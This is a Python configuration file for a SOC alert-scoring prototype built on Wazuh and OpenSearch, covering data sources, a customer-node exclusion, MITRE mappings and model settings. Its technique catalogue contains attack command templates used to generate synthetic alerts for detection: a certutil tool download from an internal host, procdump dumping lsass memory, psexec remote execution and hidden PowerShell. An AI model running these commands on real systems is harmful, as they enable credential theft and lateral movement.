"""Frozen configuration for the SOC alert semantic-layer prototype.

Everything that could silently change a reported number lives here: the data
source toggle, the customer-data exclusion, the technique catalogue used by
both the synthetic generator and the OpenSearch adaptation notes, the window
widths and the random seed.
"""

from __future__ import annotations

import os
from pathlib import Path

# --------------------------------------------------------------------------
# Paths
# --------------------------------------------------------------------------

REPO_ROOT = Path(__file__).resolve().parent.parent
ARTIFACTS_DIR = Path(os.environ.get("SOC_ARTIFACTS_DIR", REPO_ROOT / "artifacts"))
DATA_DIR = Path(os.environ.get("SOC_DATA_DIR", REPO_ROOT / "data"))

# --------------------------------------------------------------------------
# Data source toggle
#
# "synthetic"  -> soc_runtime.synthetic generates a dataset with the same
#                 schema real Wazuh alerts would have.
# "opensearch" -> soc_runtime.opensearch_client queries the real cluster.
#                 Requires SOC_OPENSEARCH_HOST / _USER / _PASSWORD in the
#                 environment; raises a clear error if they are missing
#                 rather than falling back to a default host.
#
# Nothing downstream of soc_runtime.pipeline.load_alerts() needs to know
# which source produced the DataFrame - both paths return the same columns.
# --------------------------------------------------------------------------

DATA_SOURCE = os.environ.get("SOC_DATA_SOURCE", "synthetic")

# --------------------------------------------------------------------------
# Customer-data exclusion
#
# res-engineering-collector is a customer's own collector node, mixed into
# the same cluster for operational reasons. It must never be read, scored,
# or even named in a filter that could accidentally include it - only ever
# in a filter that excludes it. This constant exists so every place that
# touches `cluster.node` excludes it from the same list.
# --------------------------------------------------------------------------

EXCLUDED_CLUSTER_NODES: frozenset[str] = frozenset({"res-engineering-collector"})

#: Nodes this prototype is actually willing to read from. An allow-list is a
#: stronger guarantee than a block-list alone: a node added to the cluster
#: after this file was written is excluded by default rather than included
#: by default.
#:
#: The default below is the *synthetic* generator's topology
#: (`office-collector`, `node01`) - it is almost certainly not the real
#: cluster's node names. Real node names are not known to this codebase (only
#: `res-engineering-collector`'s name was confirmed, as the one to exclude),
#: so pulling real data requires setting `SOC_ALLOWED_CLUSTER_NODES`
#: (comma-separated) explicitly once you know them - e.g. by running
#: `python -m soc_runtime.real_data_check --discover-nodes` first. Silently
#: keeping the synthetic default on real data would not leak
#: `res-engineering-collector` (still hard-excluded), but it *would* silently
#: drop every single real document, which is its own kind of wrong answer -
#: `filters.filter_customer_data` raises rather than returning an
#: inexplicably empty frame when this happens.
_allowed_env = os.environ.get("SOC_ALLOWED_CLUSTER_NODES")
ALLOWED_CLUSTER_NODES: frozenset[str] = (
    frozenset(n.strip() for n in _allowed_env.split(",") if n.strip())
    if _allowed_env
    else frozenset({"office-collector", "node01"})
)

# --------------------------------------------------------------------------
# OpenSearch
# --------------------------------------------------------------------------

OPENSEARCH_INDEX_PATTERN = os.environ.get("SOC_OPENSEARCH_INDEX", "wazuh-alerts-4.x-*")

# --------------------------------------------------------------------------
# Technique catalogue
#
# The techniques this prototype scopes to - the ones named in the 90-day
# MITRE coverage report as the noisy Discovery cluster, plus two techniques
# used only to construct the synthetic "manual reconnaissance escalation"
# anomaly (Credential Access, Lateral Movement) so the technique-chain
# feature has something real to detect.
#
# Tactic quirk, stated once here rather than re-explained at every call site:
# this SOC's rule engine tags T1059 (Command and Scripting Interpreter) and
# T1105 (Ingress Tool Transfer) under tactic "Discovery" - canonically MITRE
# places them under Execution and Command-and-Control respectively. That is
# not a bug in this prototype; it mirrors what the user's real 90-day MITRE
# coverage report found, and it is the kind of correlation-rule quirk that a
# per-alert semantic layer has to work with as given, not correct.
# --------------------------------------------------------------------------

TECHNIQUE_CATALOG: dict[str, dict] = {
    "T1082": {
        "tactic": "Discovery",
        "description": "System Information Discovery",
        "image": "systeminfo.exe",
        "command_template": "systeminfo.exe",
        "rule_id": 92082,
        "rule_level": 3,
        "in_scope": True,
    },
    "T1033": {
        "tactic": "Discovery",
        "description": "System Owner/User Discovery",
        "image": "whoami.exe",
        "command_template": "whoami.exe /all",
        "rule_id": 92033,
        "rule_level": 3,
        "in_scope": True,
    },
    "T1087": {
        "tactic": "Discovery",
        "description": "Account Discovery",
        "image": "net.exe",
        "command_template": "net.exe user",
        "rule_id": 92087,
        "rule_level": 5,
        "in_scope": True,
    },
    "T1069": {
        "tactic": "Discovery",
        "description": "Permission Groups Discovery",
        "image": "net.exe",
        "command_template": "net.exe group \"domain admins\" /domain",
        "rule_id": 92069,
        "rule_level": 5,
        "in_scope": True,
    },
    "T1059": {
        "tactic": "Discovery",
        "description": "Command and Scripting Interpreter",
        "image": "powershell.exe",
        "command_template": "powershell.exe -nop -w hidden -c \"Get-Process | Out-String\"",
        "rule_id": 92059,
        "rule_level": 7,
        "in_scope": True,
    },
    "T1105": {
        "tactic": "Discovery",
        "description": "Ingress Tool Transfer",
        "image": "certutil.exe",
        "command_template": "certutil.exe -urlcache -split -f http://10.20.0.9/tools/agent.exe C:\\Windows\\Temp\\agent.exe",
        "rule_id": 92105,
        "rule_level": 10,
        "in_scope": True,
    },
    "T1003": {
        "tactic": "Credential Access",
        "description": "OS Credential Dumping",
        "image": "procdump.exe",
        "command_template": "procdump.exe -ma lsass.exe lsass.dmp",
        "rule_id": 92003,
        "rule_level": 12,
        "in_scope": False,
    },
    "T1021": {
        "tactic": "Lateral Movement",
        "description": "Remote Services",
        "image": "psexec.exe",
        "command_template": "psexec.exe \\\\{host} -accepteula cmd.exe",
        "rule_id": 92021,
        "rule_level": 10,
        "in_scope": False,
    },
}

#: Techniques the semantic/baseline scoring pipeline actually scores. T1003
#: and T1021 exist only to give the escalation-chain feature a real Discovery
#: -> Credential Access -> Lateral Movement sequence to detect inside the
#: synthetic manual-recon anomaly; they are not independently scored the way
#: the six Discovery-tagged techniques are.
IN_SCOPE_TECHNIQUES: tuple[str, ...] = tuple(
    t for t, meta in TECHNIQUE_CATALOG.items() if meta["in_scope"]
)

#: Tactics that count as "escalation" if seen after a Discovery-tactic alert
#: from the same actor+host within the chain window - see semantic.py.
ESCALATION_TACTICS: frozenset[str] = frozenset({"Credential Access", "Lateral Movement"})

# --------------------------------------------------------------------------
# Technique name -> MITRE ID translation
#
# Real finding, not a hypothetical: this SOC's Wazuh installation writes
# `rule.mitre.technique` as a human-readable technique *name*
# ("System Owner/User Discovery"), not a MITRE ID ("T1033"). Discovered when
# a 30-day real-data field-completeness check reported
# `share_technique_in_the_six_scored: 0.0` - every comparison against
# `IN_SCOPE_TECHNIQUES`/`TECHNIQUE_CATALOG` (both keyed by ID) silently
# failed, in `real_data_check.py`'s report *and* in
# `modeling.restrict_to_scored_techniques`, which would have scored zero
# real alerts had it ever run against real data. Not a signal problem - a
# format mismatch. `opensearch_client.translate_technique_name` applies this
# dictionary at the point real data enters the pipeline, so everything
# downstream keeps working against IDs exactly as designed.
#
# Built from the 20 distinct technique names actually observed in one real
# 30-day window, checked one by one against the official MITRE ATT&CK
# Enterprise matrix (https://attack.mitre.org/techniques/enterprise/), not
# guessed. Two entries could not be resolved with confidence and are
# recorded as such rather than forced into a guess:
#
#   "Local Account" is the sub-technique *name* reused, unchanged, under
#   three different parent techniques - Account Discovery (T1087.001),
#   Create Account (T1136.001), and Valid Accounts (T1078.003). The bare
#   string cannot disambiguate which parent fired; only the alert's own
#   `rule.mitre.tactic` or the underlying rule could. Mapped here to
#   T1087.001 as the best-supported reading (this SOC's 30-day sample
#   already tags a separate "Account Discovery" alert, i.e. T1087's parent,
#   and the surrounding 19 names skew heavily toward the Discovery tactic
#   this whole prototype targets) - a documented judgment call, not a
#   verified fact. If a future real run's `rule.mitre.tactic` values for
#   these alerts turn out not to be "Discovery", this entry is wrong and
#   needs revisiting, not defended.
#
#   "Tool" is not in this dictionary at all, deliberately. No MITRE
#   Enterprise technique is named "Tool" - MITRE ATT&CK draws a hard line
#   between *Techniques* (behaviours) and *Software* (the tools/malware
#   used to carry them out), and "Tool" reads like an artifact of this
#   specific Wazuh rule/decoder rather than a genuine technique reference.
#   Left unmapped on purpose so it surfaces in
#   `real_data_check.py`'s unmapped-technique report instead of being
#   silently guessed into some plausible-sounding ID (T1105, "Ingress Tool
#   Transfer", was considered and rejected - the word "Tool" appearing in
#   both is not evidence of a match).
#
# Any name observed on a future real run that is not a key here passes
# through `translate_technique_name` unchanged (never silently dropped) and
# shows up the same way "Tool" does - visible, not guessed at.
# --------------------------------------------------------------------------

TECHNIQUE_NAME_TO_ID: dict[str, str] = {
    "Account Discovery": "T1087",
    "Application Shimming": "T1546.011",
    "Command and Scripting Interpreter": "T1059",
    "Compile After Delivery": "T1027.004",
    "Exfiltration Over Web Service": "T1567",
    "File Deletion": "T1070.004",
    "Hidden Window": "T1564.003",
    "Local Account": "T1087.001",  # judgment call - see the note above
    "Network Share Discovery": "T1135",
    "Obfuscated Files or Information": "T1027",
    "PowerShell": "T1059.001",
    "Process Injection": "T1055",
    "Regsvr32": "T1218.010",
    "Remote Services": "T1021",
    "Remote System Discovery": "T1018",
    "Scheduled Task": "T1053.005",
    "System Network Configuration Discovery": "T1016",
    "System Owner/User Discovery": "T1033",
    "Windows Command Shell": "T1059.003",
    # "Tool" intentionally absent - see the note above.
}

# --------------------------------------------------------------------------
# Windows the semantic layer aggregates over
# --------------------------------------------------------------------------

FREQ_SHORT_WINDOW_HOURS = 24.0
FREQ_LONG_WINDOW_DAYS = 7.0
CHAIN_WINDOW_MINUTES = 15.0

#: Time-of-day / weekend buckets used by the temporal-typicality feature.
#: (start_hour_inclusive, end_hour_exclusive, label)
HOUR_BANDS: tuple[tuple[int, int, str], ...] = (
    (0, 6, "night"),
    (6, 12, "morning"),
    (12, 18, "afternoon"),
    (18, 24, "evening"),
)

#: Laplace smoothing prior for the temporal-typicality histogram - keeps a
#: brand-new actor's first alert from producing a hard 0/1 rather than a
#: cautious mid-range score.
TEMPORAL_PRIOR_COUNT = 1.0

# --------------------------------------------------------------------------
# Experiment protocol
# --------------------------------------------------------------------------

SEED = 20260812

#: The synthetic generator's 90-day window ends here by default (`synthetic.generate_alerts`'s
#: `end` parameter). Pinned rather than defaulting to "today", the way the
#: rest of this file pins the seed and hyperparameters: `generate_alerts()`
#: used to anchor on `pd.Timestamp.now()`, which meant the entire 90-day
#: window - and every downstream number in this README - silently shifted by
#: one day every day the pipeline was run, because different calendar days
#: land in different weekday/weekend positions. That is a real regression
#: this constant fixes; `tests/test_synthetic.py::test_default_end_date_is_pinned_not_today`
#: checks it stays pinned.
#: A plain string, not a `pd.Timestamp` - kept here so this module (frozen
#: settings only) does not need a pandas dependency; `synthetic.py` parses it.
SYNTHETIC_END_DATE = "2026-08-12"

#: Chronological split: the first fraction of days by calendar date trains,
#: the rest is held out. Never shuffled - see modeling.py.
TRAIN_FRACTION = 0.70

#: Decision threshold used for the reported precision/recall/FP-rate table.
DECISION_THRESHOLD = 0.50

LOGREG_PARAMS = {
    "max_iter": 2000,
    "C": 1.0,
    "class_weight": "balanced",
    "random_state": SEED,
}

# --------------------------------------------------------------------------
# Confidence router
#
# Same idea as ids-semantic/ids_runtime/router.py: keep the raw (baseline)
# model as the cheap primary and pay for the semantic/union model only
# inside an uncertainty band of raw scores. The band is fitted on
# out-of-fold *training* scores; nothing here may touch the held-out set.
# --------------------------------------------------------------------------

#: Chronological expanding-window folds used to get out-of-fold raw scores
#: on the training set. Fold 0 is training-only (it has no earlier data to
#: be predicted from), so folds 1..N-1 carry the out-of-fold scores. Kept
#: small relative to ids-semantic's 4 because the training set here is
#: ~2,000 rows, not millions - too many folds would leave fold 1 fitted on
#: too little data to be a meaningful "early" model.
ROUTER_OOF_FOLDS = 4

#: The one knob. The band is chosen to capture as many of the raw model's
#: out-of-fold errors as possible while routing at most this share of
#: training alerts down the expensive path. Comes from the operational
#: premise - the second stage has to stay a small minority of traffic -
#: not from the data.
ROUTER_TRAFFIC_BUDGET = 0.05

#: Reported alongside the fitted band as the obvious naive choice.
ROUTER_NAIVE_BAND = (0.30, 0.70)

#: Budgets swept to publish the full affordability frontier, so a reader can
#: pick a different budget than the default 5%.
ROUTER_BUDGET_FRONTIER = (0.02, 0.05, 0.10, 0.20, 0.35, 0.50)

#: Number of quantile cut points considered on each side of the threshold
#: when searching for the band. Logistic-regression scores are far less
#: piled against 0/1 than a boosted model's, but the grid is still taken
#: from the score distribution rather than spaced uniformly, for the same
#: reason ids-semantic does: resolution has to sit where the mass is.
ROUTER_GRID_POINTS = 120

# --------------------------------------------------------------------------
# Real data - first contact
#
# The real cluster carries ~1.22M documents over the last 30 days
# (~40,700/day) with history back to 2026-05-04. `real_data_check.py` is
# deliberately not allowed to default to pulling that much: a first run
# against a real cluster should be small, fast, and cheap to re-run while
# something is still wrong with the field mapping.
# --------------------------------------------------------------------------

#: Default lookback window for `real_data_check.py`'s first-contact run.
REAL_DATA_DEFAULT_WINDOW_DAYS = 5

#: `real_data_check.py` refuses a window wider than this without an explicit
#: `--allow-large-window` flag - a guard against fat-fingering `--days 90`
#: and accidentally scrolling through the whole 30-day/1.2M-document corpus
#: on what was supposed to be a bounded first check.
REAL_DATA_MAX_WINDOW_DAYS = 14

#: If `opensearch_client.count_alerts` reports more than this many documents
#: in the requested window, `real_data_check.py` refuses to scroll through
#: them without `--allow-large-window`, regardless of the day count - a
#: short window on an unexpectedly busy cluster segment could still be huge.
REAL_DATA_COUNT_SAFETY_LIMIT = 300_000

# --------------------------------------------------------------------------
# Fourth source: Kaspersky Endpoint Security (KES)
#
# Confirmed structurally present on the real cluster (`data.KES.*`,
# `data.srcip`, `data.host`) but never part of the original design - only
# three sources were anticipated (Sysmon process creation, Sysmon/Windows
# auth, Suricata network alerts), and even Suricata was never actually
# implemented in the synthetic generator (see synthetic.py - it only ever
# produces Sysmon process-creation and Windows-auth rows).
#
# Decision for this iteration: OPTION A - classify and count KES documents
# explicitly (`opensearch_client.classify_source` returns "kes"), route them
# to `event_category="kes_endpoint"`, and let them fall through
# `semantic.build_features`'s existing `event_category == "process_creation"`
# filter unscored, same as Suricata's "network" and any genuinely unknown
# shape's "unknown". They are *seen and counted* in `real_data_check.py`'s
# report, never silently dropped or silently miscounted as something else.
#
# Option B (mapping KES's own fields onto the actor/host/technique schema)
# was rejected for this iteration: it would require reviewing KES's actual
# event taxonomy - what KES calls an "actor", what counts as a "technique"
# in its schema, whether its alerts carry MITRE tags at all - none of which
# has been done. Guessing that mapping under real-data time pressure is
# exactly how a semantic layer quietly starts scoring nonsense it was never
# validated against. If KES coverage matters later, it deserves the same
# design pass Sysmon process-creation got, not a rushed field-name guess.
# --------------------------------------------------------------------------

KES_HANDLING = "excluded_but_counted"  # see the decision above; not a silent drop

# --------------------------------------------------------------------------
# Real aggregate calibration targets for synthetic_v2.py
#
# Every number below is an aggregated, non-personal statistic (a share, a
# mean, a median, a count) taken from the same real 30-day window already
# referenced throughout the README's "Real data" section (the third real
# run - node audit confirmed, 59,680 process-creation alerts). Nothing here
# is a raw record, a name, an IP, or a specific host - only distributional
# shape, which is exactly the category of thing already treated as safe to
# hand to this codebase (see the README's customer-data handling).
#
# `synthetic.py` (v1) is untouched and remains the documented, reproducible
# baseline every existing published number in this README was measured
# against - these targets calibrate `synthetic_v2.py` only, a separate
# generator, not a replacement.
#
# `tests/test_synthetic_v2.py` checks the generated corpus's own measured
# statistics land within a stated tolerance of these targets - "calibrated
# toward", not "exactly reproduces", since only summary moments (mean,
# median, a handful of shares) were available, not the full real
# distribution.
# --------------------------------------------------------------------------

REAL_CALIBRATION_TARGETS: dict[str, float] = {
    # Field completeness, process-creation subset, 30-day window, n=59,680.
    "subject_user_name_null_share": 0.9957,
    # Of the alerts subject_user_name could not identify, the share where
    # eventdata_user was populated instead - measured as exactly 100% on
    # the real window (every subject-missing alert had a usable fallback).
    "eventdata_user_rescue_share_of_missing": 1.0,
    "mitre_tag_null_share": 0.1236,
    # 34,415 of 59,680 process-creation alerts carried more than one value
    # in rule.mitre.technique. Surprisingly high - noted as a finding in
    # its own right in the README, not just a calibration input.
    "multi_valued_technique_share": 34415 / 59680,
    # Share of ALL process-creation alerts (not just MITRE-tagged ones)
    # landing in one of the six scored techniques after name->ID
    # translation - confirms the technique-name-vs-ID fix on real data.
    "in_scope_six_technique_share": 0.3482,
    "process_creation_total_30d": 59680,
    # sem_* distributions, scored subset, same window.
    "sem_freq_actor_host_technique_24h_mean": 462.0,
    "sem_freq_actor_host_technique_24h_median": 641.0,
    "sem_novel_actor_host_technique_mean": 0.0029,
    "sem_novel_actor_mean": 0.0001,
    "sem_chain_discovery_to_escalation_15m_share_nonzero": 0.0,
    "sem_actor_identity_missing_subject_mean": 1.0,
}


# --------------------------------------------------------------------------
# Multi-valued rule.mitre.technique handling
#
# 57.7% of real process-creation alerts (34,415 of 59,680 over 30 days)
# carry MORE THAN ONE value in `rule.mitre.technique` - one correlation
# rule tagging several techniques on one alert. `first_of_multivalued`
# keeps only the first, which is not merely a reporting simplification:
# `semantic.SemanticState` folds each alert into its causal state keyed on
# (actor, host, technique), so dropping the other techniques means their
# frequency counters never increment and their "seen before" sets never
# learn them. A later alert whose primary technique was previously seen
# only as a *secondary* value is then scored as novel when it is not, and
# `sem_chain_tactic_diversity_15m` - a feature whose entire purpose is
# counting distinct tactics - structurally cannot observe two tactics
# arriving on one alert. That is a correctness problem in the state, not a
# question of feature richness.
#
# Three modes, compared honestly in the README rather than one being
# assumed better:
#
#   "first_only"          Today's behaviour, kept bit-exact as the
#                         comparison baseline: read and fold the first
#                         technique/tactic only. Every published number in
#                         the README's Validation and Confidence-routing
#                         sections was measured under this mode, which is
#                         why it stays the default - changing the default
#                         would silently restate those results.
#   "primary_plus_count"  Option A. Fold ALL techniques/tactics into the
#                         state (the correctness fix), but read this
#                         alert's own features from its primary technique
#                         only, plus one new feature counting how many
#                         techniques the alert carried.
#   "aggregate"           Option C. Fold all, and read every technique,
#                         collapsing the per-technique feature values in
#                         the direction that keeps the least-explained
#                         technique visible (see semantic._AGGREGATION).
#
# `first_only` and the other two produce different feature counts (the
# multiplicity feature exists only in the latter two), which is why
# `semantic.feature_names(mode)` exists rather than one flat constant:
# adding a column that is constant on single-technique corpora still
# perturbs a fitted LogisticRegression slightly (measured: v1 PR-AUC
# 0.975616 -> 0.975429), and the published v1 numbers must not move.
# --------------------------------------------------------------------------

MULTI_TECHNIQUE_MODES = ("first_only", "primary_plus_count", "aggregate")
MULTI_TECHNIQUE_MODE = os.environ.get("SOC_MULTI_TECHNIQUE_MODE", "first_only")

#: The mode the *real-data* path uses. Split from `MULTI_TECHNIQUE_MODE`
#: deliberately: the global default stays "first_only" purely so the
#: published v1 numbers keep reproducing bit-for-bit, and v1 has no
#: multi-technique alerts for the mode to change anything on. Real data
#: does (57.7%), so `real_data_check.py` runs under the corrected mode
#: rather than inheriting a default that exists for reproducibility
#: reasons alone. "primary_plus_count" rather than "aggregate" - see the
#: README's multi-valued section for why the smaller correction is the
#: one adopted, given no real labels exist to validate the larger one.
REAL_DATA_MULTI_TECHNIQUE_MODE = os.environ.get(
    "SOC_REAL_DATA_MULTI_TECHNIQUE_MODE", "primary_plus_count"
)
